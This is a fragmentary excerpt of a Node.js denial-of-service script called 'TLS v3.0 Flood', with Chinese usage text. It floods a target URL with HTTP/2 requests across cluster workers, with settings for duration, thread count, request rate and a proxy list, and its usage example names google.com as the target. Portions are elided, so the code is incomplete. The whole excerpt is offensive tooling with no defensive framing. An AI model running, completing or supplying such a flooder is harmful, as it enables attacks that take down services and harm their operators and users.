...
if (process.argv.length < 7) {
    console.clear();
    console.log(`
    ${`${'TLS v3.0 Flood'.underline}`.italic}

    ${'方法：'.bold.underline}

        ${`node TLS.js ${'['.red.bold}目标${']'.red.bold} ${'['.red.bold}时间${']'.red.bold} ${'['.red.bold}线程${']'.red.bold} ${'['.red.bold}速率${']'.red.bold} ${'['.red.bold}代理${']'.red.bold} ${'('.red.bold}选项${')'.red.bold}`.italic}
        ${'node TLS.js https://google.com/ 300 5 50 proxy.txt'.italic}
...
function generate_headers(method = "GET", path = parsed.path) {
            ...
            const client = http2.connect(parsed.href, {
                ...
                function request() {
                    ...
                    for (let i = 0; i < rate; i++) {
                        let method = enabled('mix') ? methods[Math.floor(Math.random() * methods.length)] : "GET";
                        let headers = generate_headers(method);

                        const req = client.request(headers);

                        if (method === "POST") {
                            req.write(random_string(10, 20));
                        }
...
if (cluster.isMaster) {
    ...
    console.clear();
    console.log(`
            ${'方法'.bold}      ${'-'.red}   ${'['.red} ${`TLS v3.0`.italic} ${']'.red} 
